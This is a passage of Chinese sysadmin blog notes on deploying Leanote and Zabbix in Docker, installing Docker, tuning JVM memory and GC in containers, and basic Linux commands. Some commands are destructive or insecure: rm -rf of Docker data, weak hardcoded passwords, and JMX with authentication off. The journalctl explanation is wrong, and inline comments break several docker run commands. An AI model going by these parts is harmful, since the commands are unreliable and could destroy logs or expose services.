<h3 id="Leanote"><a href="#Leanote" class="headerlink" title="Leanote"></a>Leanote</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker pull axboy/leanote</span><br><span class="line"></span><br><span class="line">sudo docker run -d -p 9800:9000 \</span><br><span class="line">    -e &quot;TZ=Asia/Shanghai&quot;\</span><br><span class="line">    -v /data/leanote/db:/data/db \</span><br><span class="line">    -v /data/leanote/conf/:/data/leanote/conf \</span><br><span class="line">    -v /data/leanote/files:/data/leanote/files \</span><br><span class="line">    -v /data/leanote/upload:/data/leanote/public/upload \</span><br><span class="line">    --name leanote \</span><br><span class="line">    axboy/leanote</span><br></pre></td></tr></table></figure>

<h3 id="Zabbix"><a href="#Zabbix" class="headerlink" title="Zabbix"></a>Zabbix</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull mysql:8.0</span><br><span class="line"></span><br><span class="line">docker run --name mysql-server -t \</span><br><span class="line">-v mysql_data:/var/lib/mysql \-v mysql_logs:/var/log/mysql \</span><br><span class="line">-v mysql_conf:/etc/mysql \-e MYSQL_DATABASE=&quot;zabbix&quot; \</span><br><span class="line">-e MYSQL_USER=&quot;zabbix&quot; \</span><br><span class="line">-e MYSQL_PASSWORD=&quot;zabbix_pwd&quot; \</span><br><span class="line">-e MYSQL_ROOT_PASSWORD=&quot;123456&quot; \</span><br><span class="line">--restart=unless-stopped \-d mysql:8.0 \--character-set-server=utf8 --collation-server=utf8_bin \--default-authentication-plugin=mysql_native_password</span><br><span class="line"></span><br><span class="line">docker pull zabbix/zabbix-java-gateway:alpine-6.2-latest</span><br><span class="line"></span><br><span class="line">docker run --name zabbix-java-gateway -t \</span><br><span class="line">--restart=unless-stopped \-d zabbix/zabbix-java-gateway:alpine-6.2-latest</span><br><span class="line"></span><br><span class="line">docker pull zabbix/zabbix-server-mysql:6.2-alpine-latest</span><br><span class="line"></span><br><span class="line">docker volume create -d local zabbix_server</span><br><span class="line"></span><br><span class="line">docker run --name zabbix-server-mysql -t \</span><br><span class="line">-v zabbix_server:/etc/zabbix \-e DB_SERVER_HOST=&quot;mysql-server&quot; \</span><br><span class="line">-e MYSQL_DATABASE=&quot;zabbix&quot; \</span><br><span class="line">-e MYSQL_USER=&quot;zabbix&quot; \</span><br><span class="line">-e MYSQL_PASSWORD=&quot;zabbix_pwd&quot; \</span><br><span class="line">-e MYSQL_ROOT_PASSWORD=&quot;123456&quot; \</span><br><span class="line">-e ZBX_JAVAGATEWAY=&quot;zabbix-java-gateway&quot; \</span><br><span class="line">--link mysql-server:mysql \--link zabbix-java-gateway:zabbix-java-gateway \--restart=unless-stopped \-p 10051:10051 \-d zabbix/zabbix-server-mysql:alpine-6.2-latest</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注释：此方式适合所有容器部署在同一台主机上，如果是分开部署，则在前面的步骤需要开放相关端口，并通过局域网进行连接。</span></span><br><span class="line"></span><br><span class="line">docker pull zabbix/zabbix-web-nginx-mysql:alpine-6.2-latest</span><br><span class="line"></span><br><span class="line">docker run --name zabbix-web-nginx-mysql -t \</span><br><span class="line">-e PHP_TZ=&quot;Asia/Shanghai&quot; \</span><br><span class="line">-e ZBX_SERVER_HOST=&quot;zabbix-server-mysql&quot; \</span><br><span class="line">-e DB_SERVER_HOST=&quot;mysql-server&quot; \</span><br><span class="line">-e MYSQL_DATABASE=&quot;zabbix&quot; \</span><br><span class="line">-e MYSQL_USER=&quot;zabbix&quot; \</span><br><span class="line">-e MYSQL_PASSWORD=&quot;zabbix_pwd&quot; \</span><br><span class="line">-e MYSQL_ROOT_PASSWORD=&quot;123456&quot; \</span><br><span class="line">--link mysql-server:mysql \--link zabbix-server-mysql:zabbix-server \-p 80:8080 \--restart unless-stopped \-d zabbix/zabbix-web-nginx-mysql:alpine-6.2-latest</span><br></pre></td></tr></table></figure>

<h3 id="Zabbix-Agent"><a href="#Zabbix-Agent" class="headerlink" title="Zabbix Agent"></a>Zabbix Agent</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull zabbix/zabbix-agent:alpine-6.2-latest</span><br><span class="line"></span><br><span class="line">docker volume create -d local zabbix_agent</span><br><span class="line"></span><br><span class="line">docker run --name zabbix-agent -t \</span><br><span class="line">-v zabbix_agent:/etc/zabbix \-e ZBX_HOSTNAME=&quot;host-01&quot; \</span><br><span class="line">-e ZBX_SERVER_HOST=&quot;192.168.214.112&quot; \</span><br><span class="line">-e ZBX_SERVER_PORT=10051 \-p 10050:10050 \--restart=unless-stopped \--privileged \-d zabbix/zabbix-agent:alpine-6.2-latest</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注释：如果是部署在zabbix Server主机上的监控agent，此时的ZBX_SERVER_HOST需改为zabbix server的容器IP，而不能用主机IP。</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker总结二【部署与配置】</title>
    <url>/cnblogs.github.io/p/31878.html</url>
    <content><![CDATA[<h4 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h4><p>1、卸载旧版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum remove docker docker-client docker-client-latest docker-common docker-latest docker-latest-logrotate docker-logrotate docker-engin</span><br></pre></td></tr></table></figure>
<p>2、安装Docker依赖的安装包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y yum-utils</span><br><span class="line">yum install -y libseccomp</span><br></pre></td></tr></table></figure>
<p>3、设置镜像仓库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line">yum-config-manager --add-repo http://mirrors.tencent.com/docker-ce/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>
<p>4、更新yum索引</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum makecache fast 或者 yum makecache 或者 yum makecache --refresh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注意事项</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># yum makecache 完整重建缓存，会下载并解析所有可用软件源的元数据。</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># yum makecache fast  仅更新自上次缓存以来发生变化的元数据（增量更新），速度更快。在 CentOS 8/RHEL 8+ 中已被弃用，改用 yum makecache</span></span> </span><br></pre></td></tr></table></figure>
<p>5、安装docker相关容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install docker-ce docker-ce-cli containerd.io --allowe</span><br></pre></td></tr></table></figure>
<p>6、启动docker与开机启动</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br><span class="line"></span><br><span class="line">systemctl enable docker</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># docker版本，查看是否安装上正常运行</span></span></span><br><span class="line">docker version</span><br></pre></td></tr></table></figure>
<p>7、安装compose</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 删除失败的docker-compose</span></span></span><br><span class="line">sudo rm -f /usr/local/bin/docker-compose</span><br><span class="line">curl -L https://github.com/docker/compose/releases/download/2.21.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>
<p>8、授权</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chmod +x /usr/local/bin/docker-compose</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">验证安装</span></span><br><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure>
<p>9、卸载docker</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum remove docker-ce docker-ce-cli containerd.io --allow</span><br><span class="line">rm -rf /var/lib/docker</span><br><span class="line">rm -rf /var/lib/containerd</span><br></pre></td></tr></table></figure>

<h4 id="修改镜像源"><a href="#修改镜像源" class="headerlink" title="修改镜像源"></a>修改镜像源</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;registry-mirrors&quot;: [</span><br><span class="line">		&quot;https://docker.13140521.xyz&quot;,</span><br><span class="line">		&quot;https://docker.1panel.live&quot;</span><br><span class="line">	]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 重启docker 服务</span><br><span class="line">sudo systemctl restart docker</span><br><span class="line"></span><br><span class="line"># 验证</span><br><span class="line">docker info</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker总结四【Java服务内存与GC优化配置】</title>
    <url>/cnblogs.github.io/p/112a.html</url>
    <content><![CDATA[<h2 id="一、设置-Docker-容器内存限制"><a href="#一、设置-Docker-容器内存限制" class="headerlink" title="一、设置 Docker 容器内存限制"></a>一、设置 Docker 容器内存限制</h2><h3 id="停止并重新启动容器（带内存限制）"><a href="#停止并重新启动容器（带内存限制）" class="headerlink" title="停止并重新启动容器（带内存限制）"></a>停止并重新启动容器（带内存限制）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1. 停止当前容器</span></span><br><span class="line">docker stop 93d0055fd7e1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2. 启动新容器（设置8GB内存限制，禁用swap）</span></span><br><span class="line">docker run -d \</span><br><span class="line">  --name app-service \</span><br><span class="line">  --memory 8g \                  # 限制8GB内存</span><br><span class="line">  --memory-swap=0 \              # 禁用swap空间</span><br><span class="line">  --sysctl vm.swappiness=0 \     # 禁止使用系统swap</span><br><span class="line">  --cpus 4 \                     # 建议同时限制CPU（如4核）</span><br><span class="line">  --mount type=bind,source=/host/logs,target=/app/logs \</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">其他必要参数...</span></span><br><span class="line">  your-app-image:latest</span><br></pre></td></tr></table></figure>
<h3 id="验证内存限制生效"><a href="#验证内存限制生效" class="headerlink" title="验证内存限制生效"></a>验证内存限制生效</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker inspect app-service | grep -E &quot;Memory|Cpu&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">示例输出</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&quot;Memory&quot;</span>: 8589934592,</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&quot;CpuShares&quot;</span>: 1024,</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&quot;CpuPeriod&quot;</span>: 100000,</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&quot;CpuQuota&quot;</span>: 400000,</span></span><br></pre></td></tr></table></figure>

<h2 id="二、JVM-参数优化（适配容器内存）"><a href="#二、JVM-参数优化（适配容器内存）" class="headerlink" title="二、JVM 参数优化（适配容器内存）"></a>二、JVM 参数优化（适配容器内存）</h2><h3 id="自适应内存配置（推荐方案）"><a href="#自适应内存配置（推荐方案）" class="headerlink" title="自适应内存配置（推荐方案）"></a>自适应内存配置（推荐方案）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改Docker启动命令中的JAVA_OPTS参数</span></span><br><span class="line">docker run -d \</span><br><span class="line">  ...</span><br><span class="line">  -e JAVA_OPTS=&quot;\</span><br><span class="line">    -XX:MaxRAMPercentage=60.0 \       # 堆大小自动设为容器内存的60%（8GB→4.8GB）</span><br><span class="line">    -XX:MinRAMPercentage=50.0 \       # 最小堆大小设为50%（4GB）</span><br><span class="line">    -XX:+UseG1GC \                    # 推荐使用G1 GC</span><br><span class="line">    -XX:ParallelGCThreads=4 \         # 与容器CPU核心数一致</span><br><span class="line">    -XX:ConcGCThreads=2 \             # 并行GC线程数的1/2</span><br><span class="line">    # 其他参数...</span><br><span class="line">  &quot; \</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
<h3 id="固定堆大小配置（备选方案）"><a href="#固定堆大小配置（备选方案）" class="headerlink" title="固定堆大小配置（备选方案）"></a>固定堆大小配置（备选方案）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">若需固定堆大小（适用于内存波动小的场景）</span></span><br><span class="line">-e JAVA_OPTS=&quot;\</span><br><span class="line">  -Xms5g -Xmx5g \                   # 堆大小5GB（8GB内存的62.5%）</span><br><span class="line">  -XX:+UseG1GC \</span><br><span class="line">  -XX:ParallelGCThreads=4 \</span><br><span class="line">  ...</span><br><span class="line">&quot; \</span><br></pre></td></tr></table></figure>

<h2 id="三、启用-GC-日志与堆转储功能"><a href="#三、启用-GC-日志与堆转储功能" class="headerlink" title="三、启用 GC 日志与堆转储功能"></a>三、启用 GC 日志与堆转储功能</h2><h3 id="添加-GC-日志参数"><a href="#添加-GC-日志参数" class="headerlink" title="添加 GC 日志参数"></a>添加 GC 日志参数</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在JAVA_OPTS中添加GC日志配置</span></span><br><span class="line">-e JAVA_OPTS=&quot;\</span><br><span class="line">  ...</span><br><span class="line">  -Xlog:gc*=debug:/app/logs/gc.log:time,tags:filecount=10,filesize=20MB \</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">日志参数说明：</span></span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">gc*=debug    输出所有GC相关日志（debug级别）</span></span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">/app/logs/gc.log  日志文件路径</span></span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash"><span class="keyword">time</span>,tags    日志中包含时间和标签</span></span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">filecount=10,filesize=20MB  最多保留10个日志文件，每个20MB</span></span><br><span class="line">  ...</span><br><span class="line">&quot; \</span><br></pre></td></tr></table></figure>
<h3 id="配置-OOM-时堆转储"><a href="#配置-OOM-时堆转储" class="headerlink" title="配置 OOM 时堆转储"></a>配置 OOM 时堆转储</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-e JAVA_OPTS=&quot;\</span><br><span class="line">  ...</span><br><span class="line">  -XX:+HeapDumpOnOutOfMemoryError \</span><br><span class="line">  -XX:HeapDumpPath=/app/logs/oom.hprof \</span><br><span class="line">  ...</span><br><span class="line">&quot; \</span><br></pre></td></tr></table></figure>
<h3 id="验证日志生成"><a href="#验证日志生成" class="headerlink" title="验证日志生成"></a>验证日志生成</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入容器查看日志文件</span></span><br><span class="line">docker exec -it app-service ls -lh /app/logs/</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">应看到gc.log和可能的oom.hprof文件</span></span><br></pre></td></tr></table></figure>

<h2 id="四、实时监控与问题定位工具"><a href="#四、实时监控与问题定位工具" class="headerlink" title="四、实时监控与问题定位工具"></a>四、实时监控与问题定位工具</h2><h3 id="容器内资源监控"><a href="#容器内资源监控" class="headerlink" title="容器内资源监控"></a>容器内资源监控</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1. 查看容器实时资源使用</span></span><br><span class="line">docker stats app-service</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2. 进入容器诊断Java进程</span></span><br><span class="line">docker exec -it app-service /bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3. 查看Java进程CPU/内存</span></span><br><span class="line">top -c -p $(jps | grep java | awk &#x27;&#123;print $1&#125;&#x27;)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">4. 查看高CPU线程</span></span><br><span class="line">ps -mp $(jps | grep java | awk &#x27;&#123;print $1&#125;&#x27;) -o THREAD,tid,time | sort -k3 -r</span><br></pre></td></tr></table></figure>
<h3 id="JVM-监控工具配置"><a href="#JVM-监控工具配置" class="headerlink" title="JVM 监控工具配置"></a>JVM 监控工具配置</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1. 启用JMX远程监控（生产环境需配置认证）</span></span><br><span class="line">-e JAVA_OPTS=&quot;\</span><br><span class="line">  ...</span><br><span class="line">  -Dcom.sun.management.jmxremote \</span><br><span class="line">  -Dcom.sun.management.jmxremote.port=9999 \</span><br><span class="line">  -Dcom.sun.management.jmxremote.rmi.port=9999 \</span><br><span class="line">  -Dcom.sun.management.jmxremote.authenticate=false \</span><br><span class="line">  -Dcom.sun.management.jmxremote.ssl=false \</span><br><span class="line">  -Djava.rmi.server.hostname=容器IP或域名 \</span><br><span class="line">  ...</span><br><span class="line">&quot; \</span><br></pre></td></tr></table></figure>

<h2 id="五、优化后完整启动命令示例"><a href="#五、优化后完整启动命令示例" class="headerlink" title="五、优化后完整启动命令示例"></a>五、优化后完整启动命令示例</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">  --name app-service \</span><br><span class="line">  --memory 8g \                  # 内存限制8GB</span><br><span class="line">  --memory-swap=0 \              # 禁用swap</span><br><span class="line">  --sysctl vm.swappiness=0 \     # 禁止使用系统swap</span><br><span class="line">  --cpus 4 \                     # CPU限制4核</span><br><span class="line">  --mount type=bind,source=/host/logs,target=/app/logs \</span><br><span class="line">  -e JAVA_OPTS=&quot;\</span><br><span class="line">    -XX:MaxRAMPercentage=60.0 \       # 堆自动适配内存的60%（4.8GB）</span><br><span class="line">    -XX:MinRAMPercentage=50.0 \       # 最小堆4GB</span><br><span class="line">    -XX:+UseG1GC \                    # G1 GC算法</span><br><span class="line">    -XX:ParallelGCThreads=4 \         # GC线程数=CPU核心数</span><br><span class="line">    -XX:ConcGCThreads=2 \             # 并发GC线程数=1/2并行数</span><br><span class="line">    -XX:G1HeapRegionSize=16m \        # 堆区域大小16MB</span><br><span class="line">    -XX:InitiatingHeapOccupancyPercent=65 \ # 老年代65%触发混合收集</span><br><span class="line">    -Xlog:gc*=debug:/app/logs/gc.log:time,tags:filecount=10,filesize=20MB \</span><br><span class="line">    -XX:+HeapDumpOnOutOfMemoryError \</span><br><span class="line">    -XX:HeapDumpPath=/app/logs/oom.hprof \</span><br><span class="line">    -Djava.security.egd=file:/dev/./urandom \</span><br><span class="line">  &quot; \</span><br><span class="line">  -p 8080:8080 \                  # 应用端口映射</span><br><span class="line">  your-app-image:v1.0.0</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux笔记</title>
    <url>/cnblogs.github.io/p/24884.html</url>
    <content><![CDATA[<h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><h4 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发送邮件</span></span><br><span class="line">curl --url &#x27;smtp://smtp.example.com:587&#x27; --ssl-reqd --mail-from &#x27;sender@example.com&#x27; --mail-rcpt &#x27;recipient@example.com&#x27; --upload-file mail.txt --user &#x27;username:password&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="adduser"><a href="#adduser" class="headerlink" title="adduser"></a>adduser</h3><h4 id="基本用法-1"><a href="#基本用法-1" class="headerlink" title="基本用法"></a>基本用法</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> sudo adduser &lt;用户名&gt; &lt;组名&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">例如，让我们通过在终端中运行以下命令，将用户“sys”添加到“adm”组：</span></span><br><span class="line"> sudo adduser sys adm</span><br></pre></td></tr></table></figure>

<h3 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h3><h4 id="基本用法-2"><a href="#基本用法-2" class="headerlink" title="基本用法"></a>基本用法</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">复制文件到备份目录</span></span><br><span class="line">cp file1.txt ./howa/morea   </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">递归复制整个目录</span></span><br><span class="line">cp -r howa howb/morez    </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"> # </span><span class="language-bash">复制时保留权限、时间戳等信息</span></span><br><span class="line">cp -pr howa ./howb       </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"> # </span><span class="language-bash">归档模式（保留所有属性+递归+不跟踪符号链接）</span></span><br><span class="line">cp -a /home/user /backup/         </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="comment"># 复制链接文件本身（不跟踪指向的真实文件）</span></span></span><br><span class="line">cp -P t1.txt /backup/             </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">复制链接指向的真实文件</span></span><br><span class="line">cp -L t1.txt /backup/             </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">覆盖前逐一询问</span></span><br><span class="line">cp -i *.txt /backup/                     </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">仅复制目标目录中不存在的文件</span></span><br><span class="line">cp -n *.txt /backup/                 </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">静默覆盖已有文件（慎用！）</span></span><br><span class="line">cp -f data.db /backup/                 </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">若目标存在，生成备份文件 notes.txt~</span></span><br><span class="line">cp -b notes.txt /docs/                 </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在/backup/中创建路径 project/src/main.c</span></span><br><span class="line">cp --parents project/src/main.c /backup/ </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"> # </span><span class="language-bash">复制/dev目录下的特殊文件内容</span></span><br><span class="line">cp --copy-contents -r /dev/shm /backup/ </span><br></pre></td></tr></table></figure>

<h3 id="gzip"><a href="#gzip" class="headerlink" title="gzip"></a>gzip</h3><h4 id="基本用法-3"><a href="#基本用法-3" class="headerlink" title="基本用法"></a>基本用法</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">压缩单个文件,不保留 document.txt</span></span><br><span class="line">gzip document.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压缩文件</span></span><br><span class="line">gunzip document.txt.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看压缩文件内容</span></span><br><span class="line">zcat document.txt.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-1 至 -9：设置压缩级别</span></span><br><span class="line">gzip -9 document.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">压缩或解压缩时保留输入文件。</span></span><br><span class="line">gzip -k document.txt</span><br><span class="line">gunzip -k document.txt.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">递归压缩目录中的文件</span></span><br><span class="line">gzip -r my_folder/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压缩 .gz 文件</span></span><br><span class="line">gzip -d document.txt.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将输出写入标准输出</span></span><br><span class="line">gzip -c document.txt &gt; document.txt.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示详细信息</span></span><br><span class="line">gzip -v document.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试压缩文件完整性</span></span><br><span class="line">gzip -t document.txt.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出压缩文件信息</span></span><br><span class="line">gzip -l document.txt.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">强制压缩或解压缩</span></span><br><span class="line">gzip -f document.txt</span><br></pre></td></tr></table></figure>

<h3 id="journalctl"><a href="#journalctl" class="headerlink" title="journalctl"></a>journalctl</h3><h4 id="基本用法-4"><a href="#基本用法-4" class="headerlink" title="基本用法"></a>基本用法</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示全部日志（按时间顺序）</span></span><br><span class="line">journalctl</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">反向显示（最新日志在前）</span></span><br><span class="line">journalctl -r </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">按时间范围过滤日志（精确时间范围）</span></span><br><span class="line">journalctl --since=&quot;2024-01-01&quot; --until=&quot;2024-01-02&quot; </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">按时间范围过滤日志（显示近1小时日志）</span></span><br><span class="line">journalctl --since=&quot;1 hour ago&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">实时显示新日志（默认全部日志）</span></span><br><span class="line">journalctl -f </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">实时监控SSH服务日志</span></span><br><span class="line">journalctl -u sshd -f</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">仅显示httpd服务的错误信息</span></span><br><span class="line">journalctl -u httpd --priority=err</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">统计SSH登录失败次数</span></span><br><span class="line">journalctl -u sshd | grep &quot;Failed password&quot; | wc -l</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">分析可疑网络连接，查看成功SSH登录源IP和时间</span></span><br><span class="line">journalctl _COMM=sshd | grep &quot;Accepted&quot; | awk &#x27;&#123;print $1, $2, $11, $NF&#125;&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清理指定日期之前的日志</span></span><br><span class="line">journalctl --vacuum-time=2024-01-01</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取 2024-01-01 的时间戳（示例时间戳为 1704076800，实际需根据系统获取）</span></span><br><span class="line">start_timestamp=1704076800</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取 2024-01-10 的时间戳（示例时间戳为 1704940800，实际需根据系统获取）</span></span><br><span class="line">end_timestamp=1704940800</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清理指定时间段的日志 --vacuum-size=1 表示将删除符合时间范围的日志，最后的 1 是一个占位符，因为 --vacuum-size 需要一个参数来指定清理后的日志大小限制，但这里我们主要关注时间范围清理，所以设置为 1 表示不考虑大小限制进行清理</span></span><br><span class="line">journalctl --since=&quot;@$start_timestamp&quot; --until=&quot;@$end_timestamp&quot; --vacuum-size=1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">按日志大小清理日志</span></span><br><span class="line">journalctl --vacuum-size=1G</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清理 httpd 服务的日志</span></span><br><span class="line">journalctl --unit=httpd --vacuum-size=1G</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行的清理操作的详细信息，但不会真正删除任何日志</span></span><br><span class="line">journalctl --vacuum-size=1G --dry-run</span><br></pre></td></tr></table></figure>

